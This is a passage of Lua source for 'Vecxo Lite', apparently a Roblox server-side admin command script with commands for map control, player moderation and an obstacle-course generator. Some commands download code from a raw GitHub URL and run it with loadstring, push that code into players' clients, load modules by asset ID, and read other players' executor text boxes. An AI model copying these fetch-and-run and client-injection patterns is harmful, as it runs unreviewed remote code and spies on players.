		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			showWhitelisted(plr, whitelisted)
		end
	elseif cmd == "!logs" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			showChatLogs(plr)
		end
	elseif cmd == "!hideobby" then
		handled = true
		for i, v in pairs(game.workspace:GetDescendants()) do
			if v.Name == "Tabby" then
				for z, x in pairs(v:GetDescendants()) do
					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
						x.CanCollide = false
						x.CanTouch = false
						x.Transparency = 1
					end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ The obby is hidden successfully")
	elseif cmd == "!unhideobby" then
		handled = true
		for i, v in pairs(game.workspace:GetDescendants()) do
			if v.Name == "Tabby" then
				for z, x in pairs(v:GetDescendants()) do
					if x.Name == "Jump" or x.Name == "Jump1" or x.Name == "Jump2" or x.Name == "Jump3" or x.Name == "Jump4" or x.Name == "Jump5" or x.Name == "Jump6" or x.Name == "Jump7" or x.Name == "Jump8" or x.Name == "Jump9" or x.Name == "Barrier" and x:IsA("Part") then
						x.CanCollide = true
						x.CanTouch = true
						if x.Name == "Barrier" then
							x.Transparency = 0.6 
						else
							x.Transparency = 0
						end
					end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ The obby is unhidden successfully")
	elseif cmd == "!log" then
		local targets = GetPlayers(args[2], sender)
		for i, target in pairs(targets) do
			if target then
				if loggingPlayers[target.UserId] then
					local info = "Status: Already Logging\n"..
						"Target: "..target.Name.."\n"..
						"Action: Cannot start duplicate logger"
					notify(sender, "[Vecxo Lite]: ‚ùå Logging Error", info, 5)
					return
				end
				loggingPlayers[target.UserId] = true
				local startInfo = "Target: "..target.Name.."\n"..
					"Status: Logger Started\n"..
					"Monitoring: Executor GUIs Only\n"..
					"Check Rate: Every 1 second"
				notify(sender, "[Vecxo Lite]: üîç Script Logger", startInfo, 8)
				task.spawn(function()
					while loggingPlayers[target.UserId] and target.Parent do
						if target:FindFirstChild("PlayerGui") then
							local pg = target.PlayerGui
							for _, gui in ipairs(pg:GetChildren()) do
								if gui:IsA("ScreenGui") then
									-- Skip chat and default GUIs, focus on executors
									if gui.Name ~= "StarterGui" and gui.Name ~= "HealthGui" and gui.Name ~= "CoreGuiClone" 
										and gui.Name ~= "PlayerListGui" and gui.Name ~= "ChatGui" and gui.Name ~= "Studio Chat" then

										-- Look for executor indicators (Execute button, etc.)
										local hasExecuteBtn = gui:FindFirstChild("Execute") or gui:FindFirstChildWhichIsA("Frame"):FindFirstChild("Execute")
										local hasClearBtn = gui:FindFirstChild("Clear") or gui:FindFirstChildWhichIsA("Frame"):FindFirstChild("Clear")

										if hasExecuteBtn or hasClearBtn then
											for _, textbox in ipairs(gui:GetDescendants()) do
												if textbox:IsA("TextBox") and textbox.Text ~= "" and string.len(textbox.Text) > 20 then
													local text = textbox.Text
													local logInfo = "Player: "..target.Name.."\n"..
														"GUI: "..gui.Name.."\n"..
														"TextBox: "..textbox.Name.."\n"..
														"Script Length: "..string.len(text).." characters\n\n"..
														"Script Preview:\n"..
														string.sub(text, 1, 150)..(string.len(text) > 150 and "..." or "")
													notify(sender, "[Vecxo Lite]: ‚úÖ Executor Script Captured", logInfo, 20)
												end
											end
										end
									end
								end
							end
						end
						task.wait(1)
					end
				end)
			end
		end
		elseif cmd == "!unlog" then
		handled = true
		local target = GetPlayers(args[2], sender)
			for i, v in pairs(target) do
			if v then
				loggingPlayers[v.UserId] = nil
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Stopped logging " .. v.Name)
			end
		end
	elseif cmd == "!clr" then
		handled = true
		local playerCharacters = {}
		for _, plr in pairs(game.Players:GetPlayers()) do
			if plr.Character then
				playerCharacters[plr.Character] = true
			end
		end
		for _, v in pairs(workspace:GetChildren()) do
			if playerCharacters[v] or v:IsA("Terrain") or v.Name == "Camera" then
				continue
			end
			if v:IsA("Model") or v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") or v:IsA("TrussPart") or v:IsA("WedgePart") or v:IsA("Tool") then
				v:Destroy()
			end
			if v:IsA("Accessory") then
				v:Destroy()
			end
			if v:IsA("Sound") then
				v:Destroy()
			end
			if v:IsA("Camera") then
				if v ~= workspace.CurrentCamera then
					v:Destroy()
				end
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			local parentChar = v:FindFirstAncestorWhichIsA("Model")
			if parentChar and playerCharacters[parentChar] then
				continue
			end
			if v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
				v:Destroy()
			end
			if v:IsA("Constraint") then
				v:Destroy()
			end
			if v:IsA("Attachment") then
				v:Destroy()
			end
			if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then
				v:Destroy()
			end
			if v:IsA("Sound") then
				v:Destroy()
			end
			if v:IsA("Animation") or v:IsA("AnimationController") or v:IsA("Animator") then
				v:Destroy()
			end
		end
		for _, v in pairs(game:GetService("Lighting"):GetChildren()) do
			if not v:IsA("Camera") then
				v:Destroy()
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Workspace + Lighting cleared successfully")
	elseif cmd == "!unload" then
		handled = true
		scriptrunning = false
		local h = Instance.new("Hint", workspace)
		for i = 3, 1, -1 do
			h.Text = "[Vecxo Lite]: Unloading in ".. i .." seconds"
			task.wait(1)
		end
		h:Destroy()
		for i,v in pairs(vecxoconnections) do
			if typeof(v) ~= "function" then
				v:Disconnect()
			end
			vecxoconnections[i] = nil
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("VecxoCmds") then
					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoBanned") then
					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoCommandBar") then
					v.PlayerGui:FindFirstChild("VecxoCommandBar"):Destroy()
				end
			end
		end
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local remotesToDestroy = {
			"VecxoCommandEvent",
			"VecxoRequestToken", 
			"VecxoCommandToken"
		}
		for _, remoteName in pairs(remotesToDestroy) do
			local remote = ReplicatedStorage:FindFirstChild(remoteName)
			if remote then
				remote:Destroy()
				print("[Vecxo Lite]: Destroyed: " .. remoteName)
			end
		end
		print("[Vecxo Lite]: Remote cleanup completed!")
		whitelisted = {}
		exclusivewl = {}
		bannedPlayers = {}
		authTokens = {}
		vecxoconnections = {}
		_G.vecxosadminloaded = false
	elseif cmd == "!reloadscript" then
		handled = true
		scriptrunning = false
		local h = Instance.new("Hint", workspace)
		for i = 3, 1, -1 do
			h.Text = "[Vecxo Lite]: - ‚ö†Ô∏è Reloading in [ ".. i .." ] seconds"
			task.wait(1)
		end
		h:Destroy()
		for i,v in pairs(vecxoconnections) do
			if typeof(v) ~= "function" then
				v:Disconnect()
			end
			vecxoconnections[i] = nil
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("VecxoCmds") then
					v.PlayerGui:FindFirstChild("VecxoCmds"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoWhitelisted") then
					v.PlayerGui:FindFirstChild("VecxoWhitelisted"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoBanned") then
					v.PlayerGui:FindFirstChild("VecxoBanned"):Destroy()
				end
				if v.PlayerGui:FindFirstChild("VecxoCommandBar") then
					v.PlayerGui:FindFirstChild("VecxoCommandBar"):Destroy()
				end
			end
		end
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local remotesToDestroy = {
			"VecxoCommandEvent",
			"VecxoRequestToken", 
			"VecxoCommandToken"
		}
		for _, remoteName in pairs(remotesToDestroy) do
			local remote = ReplicatedStorage:FindFirstChild(remoteName)
			if remote then
				remote:Destroy()
				print("[Vecxo Lite]: Destroyed: " .. remoteName)
			end
		end
		print("[Vecxo Lite]: Remote cleanup completed!")
		whitelisted = {}
		exclusivewl = {}
		bannedPlayers = {}
		authTokens = {}
		vecxoconnections = {}
		_G.vecxosadminloaded = false
		local h2 = Instance.new("Hint", workspace)
		h2.Text = "[Vecxo Lite]: - Unloaded successfully"
		task.wait(1)
		h2:Destroy()
		local message = Instance.new("Hint", workspace)
		local dots = 0
		local running = true
		local check = false
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: - ‚ö†Ô∏è Attempting to automatically reload" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		task.wait(.7)
		local httpService = game:GetService("HttpService")
		local source = httpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/Vecxo")
		local func = loadstring(source)
		if not func then
			message:Destroy()
			local message2 = Instance.new("Hint", workspace)
			message2.Text = "[Vecxo Lite]: - Could not reload Vecxo Lite, HTTP 404 timed out"
			task.wait(3)
			message2:Destroy()
			return
		end
		task.spawn(func)
		message:Destroy()
		local message2 = Instance.new("Hint", workspace)
		message2.Text = "[Vecxo Lite]: - ‚úÖ Reloaded Vecxo Lite successfully"
		task.wait(3)
		message2:Destroy()
	elseif cmd == "!antiloudnoise" and args[2] then
		handled = true
		local arg = args[2]:lower()
		if arg == "true" then
			if _G.antiloud then
				notifyv3(sender, "[Vecxo Lite]:", "‚ö†Ô∏è Anti noise is already enabled")
				return
			end
			_G.antiloud = true
			plr = sender
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			if not ReplicatedStorage:FindFirstChild("LoudSoundDetected") then
				local remote = Instance.new("RemoteEvent")
				remote.Name = "LoudSoundDetected"
				remote.Parent = ReplicatedStorage
			end
			local HttpService = game:GetService("HttpService")
			local code
			local success, err = pcall(function()
				code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/AntiLoudAPIV2")
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]:", "Failed to fetch code: " .. err)
				return
			end
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end
			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			scr.Parent = plr:WaitForChild("PlayerGui")
			scr.Enabled = true
			local remote = ReplicatedStorage:WaitForChild("LoudSoundDetected")
			if not _G.loudHooked then
				ReplicatedStorage.LoudSoundDetected.OnServerEvent:Connect(function(player, soundId)
					for _, v in ipairs(workspace:GetDescendants()) do
						if v:IsA("Sound") and v.SoundId == soundId and not v:IsDescendantOf(ReplicatedStorage) then
							for _, existingHint in pairs(workspace:GetChildren()) do
								if existingHint:IsA("Hint") and existingHint.Name == "VecxoHint" then
									existingHint:Destroy()
								end
							end
							local hint = Instance.new("Hint", workspace)
							hint.Name = "VecxoHint"
							local assetName = getSoundNameFromId(v.SoundId)
							local displayName = assetName or ("Unknown Sound (" .. v.SoundId .. ")")
							v.Volume = 0
							v:Destroy()
							hint.Text = "[Vecxo Lite]: ‚úÖ Muted audio automatically - (" .. displayName .. ")"
							task.delay(4.7, function() hint:Destroy() end)
						end
					end
				end)
				_G.loudHooked = true
			end
			abc = sender.CharacterAdded:Connect(function()
				if not _G.antiloud then abc:Disconnect() return end
				plr = sender
				task.wait(1)

				local success, err = pcall(function()
					code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/AntiLoudAPIV2")
				end)

				if not success then
					notifyv3(sender, "[Vecxo Lite]:", "Failed to fetch code: " .. err)
					return
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
				loa.Parent = scr
				scr:WaitForChild("Exec").Value = code
				scr.Parent = plr:WaitForChild("PlayerGui")
				scr.Enabled = true
			end)
			task.spawn(function()
				while _G.antiloud do
					task.wait(0.3)
					for _, sound in ipairs(workspace:GetDescendants()) do
						if sound:IsA("Sound") then
							if sound.Pitch > 1 or sound.Pitch < 0.2 then
								sound.Pitch = 1
								local hint = Instance.new("Hint", workspace)
								hint.Name = "VecxoHint"
								local assetName = getSoundNameFromId(sound.SoundId)
								local displayName = assetName or ("Unknown Sound (" .. sound.SoundId .. ")")
								hint.Text = "[Vecxo Lite]: ‚úÖ Fixed pitch of audio automatically - (" .. displayName .. ")"
								task.delay(4.7, function() hint:Destroy() end)
							end
						end
					end
				end
			end)
			notify(sender, "[Vecxo Lite]:", "‚úÖ Anti noise (loudness-based) is enabled")
			local hint = Instance.new("Hint", workspace)
			hint.Text = "[Vecxo Lite]: - Anti noise (loudness-based) is enabled"
			hint.Name = "NOLoudmusic"
			task.delay(4, function() hint:Destroy() end)
		elseif arg == "false" then
			if not _G.antiloud then
				notifyv3(sender, "[Vecxo Lite]:", "Anti noise is already disabled")
				return
			end
			_G.antiloud = false
			if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				local rnpos = sender.Character.HumanoidRootPart.CFrame

				for _, v in ipairs(sender.Character:GetChildren()) do
					if v:IsA("Accessory") then
						pcall(function() v:Destroy() end)
					end
				end

				for _, item in ipairs(workspace:GetDescendants()) do
					if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
						if item.Name == sender.Character or item.Handle.Name == sender.Character then
							pcall(function() item:Destroy() end)
						end
					end
				end
				sender:LoadCharacter()
				task.wait()
				if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
					sender.Character.HumanoidRootPart.CFrame = rnpos
				end
			else
				sender:LoadCharacter()
			end
			notify(sender, "[Vecxo Lite]:", "Anti noise is disabled")
			local hint = Instance.new("Hint", workspace)
			hint.Text = "[Vecxo Lite]: | Anti noise (loudness-based) is disabled"
			hint.Name = "NOLoudmusic"
			task.delay(4, function() hint:Destroy() end)
		else
			notifyv3(sender, "[Vecxo Lite]:", "‚ö†Ô∏è Usage: !antiloudnoise true/false")
		end
	elseif cmd == "!r15" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _,plr in pairs(targets) do
			if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
				local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
				local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R15)
				morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
				morph.Name = plr.Name
				plr.Character = morph
				morph.Parent = workspace	
			end
		end
	elseif cmd == "!r6" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _,plr in pairs(targets) do
			if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
				local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
				local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
				morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
				morph.Name = plr.Name
				plr.Character = morph
				morph.Parent = workspace	
			end
		end
	elseif cmd == "!partmoving" then
		handled = true
		local desiredState = args[2]
		if desiredState == "true" then
			if _G.allowunpunishwelding == true then
				notify(sender, "[Vecxo Lite]: ", "‚úÖ Part moving is already enabled")
				return
			end
			_G.allowunpunishwelding = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Part moving is enabled")
		elseif desiredState == "false" then
			if _G.allowunpunishwelding == false then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Part moving is already disabled.")
				return
			end
			_G.allowunpunishwelding = false
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Part moving is disabled")
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ö†Ô∏è Invalid argument. Use `!partmoving true` or `!partmoving false`.")
		end
	elseif cmd == "!serverprotection" then
		handled = true
		local desiredState = args[2]
		if desiredState == "true" then
			if serverprotection then
				notify(sender, "[Vecxo Lite]: ", "‚úÖ Server protection is already enabled.")
				return
			end
			serverprotection = true
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Lime green", 3)
			end)
			for _, player in ipairs(Players:GetPlayers()) do
				setupPlayer(player)
				if not table.find(AutoRespawn, player.Name) then
					table.insert(AutoRespawn, player.Name)
					createAntiDeathProtection(player)
				else
					warn("[Vecxo Lite]:", "‚úÖ "..player.Name .. " already has antikill enabled!")
				end
				--vecxoconnections["AntiKill3"](player)
				if AutoUnpunish[player.Name] then
					warn("[Vecxo Lite]:",  player.Name .. " already has antipunish enabled!")
				else
					AutoUnpunish[player.Name] = true
					if vecxoconnections["AntiPunish3"] then
						vecxoconnections["AntiPunish3"](player)
					end
				end
				notify(player, "[Vecxo Lite]: ", "‚ö†Ô∏è Server protection enabled, abusing will not be allowed.")
			end
			if not playerConnections.PlayerAddedConn then
				playerConnections.PlayerAddedConn = Players.PlayerAdded:Connect(function(player)
					setupPlayer(player)
					if not table.find(AutoRespawn, player.Name) then
						table.insert(AutoRespawn, player.Name)
						createAntiDeathProtection(player)
					else
						warn("[Vecxo Lite]:", "‚úÖ "..player.Name .. " already has antikill enabled!")
					end
					if AutoUnpunish[player.Name] then
						warn("[Vecxo Lite]:",  player.Name .. " already has antipunish enabled!")
					else
						AutoUnpunish[player.Name] = true
						if vecxoconnections["AntiPunish3"] then
							vecxoconnections["AntiPunish3"](player)
						end
					end
					notify(player, "[Vecxo Lite]: ", "‚ö†Ô∏è Server protection enabled, abusing will not be allowed.")
				end)
			end
			task.spawn(function()
				while true do
					if serverprotection and not debrisProtectionRunning then
						debrisProtectionRunning = true
						while serverprotection do
							local all = workspace:GetDescendants()
							if #all > 1000 then
								for _, inst in ipairs(all) do
									if inst:IsA("BasePart") and not inst.Anchored then
										local parentModel = inst:FindFirstAncestorOfClass("Model")
										if parentModel and game.Players:GetPlayerFromCharacter(parentModel) then continue end
										if inst:IsDescendantOf(game:GetService("Players")) then continue end
										if inst:IsDescendantOf(workspace.CurrentCamera) then continue end
										if inst:IsA("Accessory") or inst:IsA("Tool") then continue end
										inst.Anchored = true
									end
								end
							end
							task.wait(0.3)
						end
						debrisProtectionRunning = false
					end
					task.wait(0.3)
				end
			end)
		elseif desiredState == "false" then
			if not serverprotection then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Server protection is already disabled.")
				return
			end
			for _, player in ipairs(Players:GetPlayers()) do
				if table.find(AutoRespawn, player.Name) then
					table.remove(AutoRespawn, table.find(AutoRespawn, player.Name))
					cleanupPlayerConnections(player)
				end
				if AutoUnpunish[player.Name] then
					AutoUnpunish[player.Name] = nil
				end
			end
			serverprotection = false
			debrisProtectionRunning = false
			warnings = {}
			cleanupConnections()
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Really red", 3)
			end)
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Server protection disabled.")
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ö†Ô∏è Invalid argument. Use `!serverprotection true` or `!serverprotection false`.")
		end
	elseif cmd == "!antialt" then
		handled = true
		local desiredState = args[2]
		if desiredState == "true" then
			if antialtEnabled then
				notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Anti-alt is already enabled.")
				return
			end
			antialtEnabled = true
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Lime green", 3)
			end)
			for _, player in ipairs(Players:GetPlayers()) do
				if player.AccountAge < 2 then
					player:Kick("‚ùå Your account is too new to join this game (must be 2+ days old).")
					notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Kicked " .. player.Name .. " for being a new account.")
				end
			end
			if not playerConnections.AntiAltAddedConn then
				playerConnections.AntiAltAddedConn = Players.PlayerAdded:Connect(function(player)
					if antialtEnabled and player.AccountAge < 2 then
						player:Kick("‚ùå Your account is too new to join this game (must be 2+ days old).")
						notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Kicked " .. player.Name .. " for being a new account.")
					end
				end)
			end
			notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Anti-alt enabled. Accounts younger than 2 days will be kicked.")
		elseif desiredState == "false" then
			if not antialtEnabled then
				notifyv3(sender, "[Vecxo Lite]:", "‚ùå Anti-alt is already disabled.")
				return
			end
			antialtEnabled = false
			if playerConnections.AntiAltAddedConn then
				playerConnections.AntiAltAddedConn:Disconnect()
				playerConnections.AntiAltAddedConn = nil
			end
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Really red", 3)
			end)
			notifyv3(sender, "[Vecxo Lite]:", "‚ùå Anti-alt disabled.")
		else
			notifyv3(sender, "[Vecxo Lite]:", "‚ö†Ô∏è Invalid argument. Use `!antialt true` or `!antialt false`.")
		end
	elseif cmd == "!backpack" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local option = args[3]

		if option ~= "true" and option ~= "false" then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ö†Ô∏è The values are true or false! example: !backpack plr true")
		end

		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, %s)
				script:Destroy()
			]], option)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
			--	notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ "..plr.DisplayName.."'s backpack has been set to - "..args[3])
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "'s backpack has been set to - "..args[3]))
	elseif cmd == "!savemap" then
		handled = true
		if mapBackup then mapBackup:ClearAllChildren() end
		for _, item in ipairs(workspace:GetChildren()) do
			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
				local cloned = item:Clone()
				cloned.Parent = mapBackup
			end
		end
		notifyv3(sender, "[Vecko Lite]: ", "‚úÖ Map has been backed up.")
	elseif cmd == "!loadmap" then
		handled = true
		for _, item in ipairs(workspace:GetChildren()) do
			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
				item:Destroy()
			end
		end
		for _, backupItem in ipairs(mapBackup:GetChildren()) do
			local clone = backupItem:Clone()
			clone.Parent = workspace
		end
		task.wait(0.5)
		for i, v in pairs(game.Players:GetPlayers()) do
			v:LoadCharacter()
		end
		notifyv3(sender, "[Vecko Lite]: ", "‚úÖ Map has been restored from backup.")
	elseif cmd == "!restoremap" then
		handled = true
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tabby") then
			require(87631077502363).load("Kah")
		end

		local Tabby = workspace:FindFirstChild("Tabby")
		local _Game = workspace.Terrain:FindFirstChild("_Game")

		if not (Tabby and _Game) then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain

			if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
			end

			if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
			end 

			if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
			end 

			return
		end

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
		Tabby:Destroy()

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain
		_Game:Destroy()

		if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
		end 

		if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
		end 

		if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Map has been restored")
	elseif cmd == "!gobby" then
		handled = true
		local basePos = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and sender.Character.HumanoidRootPart.Position or Vector3.new(0, 10, 0)
		local spacing = 10
		local height = 5
		local blocks = {}

		local function createSpherePlatform(position, color)
			local part = Instance.new("Part")
			part.Size = Vector3.new(6, 1, 4)
			part.Anchored = true
			part.Position = position
			part.Material = Enum.Material.Neon
			part.BrickColor = color or BrickColor.Random()
			part.Name = "JumpPart"

			local mesh = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Cylinder
			mesh.Parent = part

			part.Parent = workspace
			task.spawn(function()
				while part and part.Parent do
					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
					task.wait(0.03)
				end
			end)
			return part
		end

		local function createDisappearTile(position)
			local part = createSpherePlatform(position, BrickColor.Random())
			local cooldown = false

			part.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChild("Humanoid")
				if hum and not cooldown then
					cooldown = true
					local originalTransparency = part.Transparency
					local originalCanCollide = part.CanCollide

					task.delay(0.3, function()
						part.CanCollide = false
						part.Transparency = 1
						task.wait(3)
						part.CanCollide = originalCanCollide
						part.Transparency = originalTransparency
						cooldown = false
					end)
				end
			end)

			return part
		end


		local function createRotatingPlatform(position)
			local part = Instance.new("Part")
			part.Size = Vector3.new(3, 1, 4)
			part.Position = position
			part.Anchored = true
			part.BrickColor = BrickColor.new("Bright yellow")
			part.Material = Enum.Material.Neon
			part.Name = "RotatingPlatform"
			part.Parent = workspace
			local v = Instance.new("BodyVelocity")
			v.Velocity = Vector3.new(40, 0, 0)
			v.MaxForce = Vector3.new(1e9, 0, 0)
			v.Parent = part
			task.spawn(function()
				while part and part.Parent do
					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
					task.wait(0.03)
				end
			end)
			return part
		end

		for i = 1, 30 do
			local position = basePos + Vector3.new(i * spacing, i * height * 0.2, 0)
			local part

			if i % 3 == 0 then
				part = createDisappearTile(position)
			else
				part = createDisappearTile(position)
			end

			table.insert(blocks, part)

			if i % 1 == 0 then
				local killPart = Instance.new("Part")
				killPart.Size = Vector3.new(1, 3.8, 11)
				killPart.Position = part.Position + Vector3.new(-spacing / 2, 1, 0)
				killPart.Anchored = true
				killPart.BrickColor = BrickColor.new("Really red")
				killPart.Material = Enum.Material.Neon
				killPart.Name = "KillBrick"
				killPart.Touched:Connect(function(hit)
					local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
					if hum then hum.Health = 0 end
				end)
				killPart.Parent = workspace
			end

			if i % 4 == 0 then
				createRotatingPlatform(part.Position + Vector3.new(0, 0, 0))
				part.Transparency = 1
			end
		end

		local lastPart = blocks[#blocks]
		local rainbowStart = lastPart and lastPart.Position or basePos + Vector3.new(30 * spacing, 0, 0)

		local function createRainbowFadeStep(position, delayOffset)
			local part = Instance.new("Part")
			part.Size = Vector3.new(4, 1, 4)
			part.Anchored = true
			part.Position = position
			part.Material = Enum.Material.Neon
			part.Name = "RainbowStep"
			part.BrickColor = BrickColor.Random()
			part.Parent = workspace

			local cooldown = false
			part.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChild("Humanoid")
				if hum and not cooldown then
					cooldown = true
					local origColor = part.BrickColor
					local origTransparency = part.Transparency

					for i = 1, 10 do
						part.Transparency = i / 10
						task.wait(0.02)
					end
					part.CanCollide = false

					task.delay(2 + delayOffset, function()
						for i = 10, 1, -1 do
